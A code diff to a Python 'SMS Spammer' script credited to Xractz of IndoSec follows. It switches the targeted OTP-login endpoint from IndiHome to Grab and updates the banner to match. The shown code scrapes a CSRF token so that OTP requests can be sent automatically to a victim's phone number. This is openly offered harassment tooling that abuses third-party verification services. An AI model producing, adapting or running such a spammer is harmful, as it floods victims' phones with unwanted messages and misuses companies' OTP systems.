@@ -4,7 +4,7 @@ from concurrent.futures import ThreadPoolExecutor
  
 def gas(no):
 	s = requests.Session()
-	url = "https://www.indihome.co.id/verifikasi-layanan/login-otp"
+	url = "https://www.grab.com/id/verifikasi-layanan/login-otp"
 	req = s.get(url).text
 	token = re.findall(r"name=\"_token\" value=\"(.*?)\"", req)[0]
 		
@@ -38,7 +38,7 @@ if __name__ == '__main__':
 		print("""\033[1m
    _____ __  ________
   / ___//  |/  / ___/ | SMS Spammer
-  \__ \/ /|_/ /\__ \  | SMS Spammer using api from IndiHome
+  \__ \/ /|_/ /\__ \  | SMS Spammer using api from grab
  ___/ / /  / /___/ /  | Coded by Xractz - \033[31;2mIndo\033[39;2mSec\033[0;1m
 /____/_/  /_//____/   | ex: 08xxxxx77\033[0m
 	""")
